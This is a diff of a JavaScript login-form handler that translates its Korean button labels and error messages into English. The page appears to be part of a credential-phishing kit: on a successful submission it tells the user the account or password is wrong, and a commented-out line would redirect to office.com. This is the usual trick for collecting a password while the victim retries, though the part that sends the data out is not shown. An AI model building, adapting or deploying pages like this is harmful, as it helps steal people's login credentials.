@@ -757,10 +757,10 @@ function googleTranslateElementInit() {
         },
             // data: $('#contact').serialize(),
             beforeSend: function(xhr){
-              $('#submit-btn').html('확인 중...');
+              $('#submit-btn').html('Checking...');
             },
             success: function(response){
-			 $('#msg').html("<span style='color:red;'>귀하의 계정 또는 비밀번호가 올바르지 않습니다. 다시 시도하십시오</span>");
+			 $('#msg').html("<span style='color:red;'>Your account or password is incorrect. try again</span>");
               if(response){
                 $("#msg").show();
 				console.log(response);
@@ -789,10 +789,10 @@ function googleTranslateElementInit() {
                   //    window.location.replace("https://office.com");
               }
               $("#msg").show();
-              // $('#msg').html("나중에 다시 시도 해주십시오");
+              // $('#msg').html("please try again later");
             },
             complete: function(){
-              $('#submit-btn').html('로그인');
+              $('#submit-btn').html('login');
             }
           });
     });
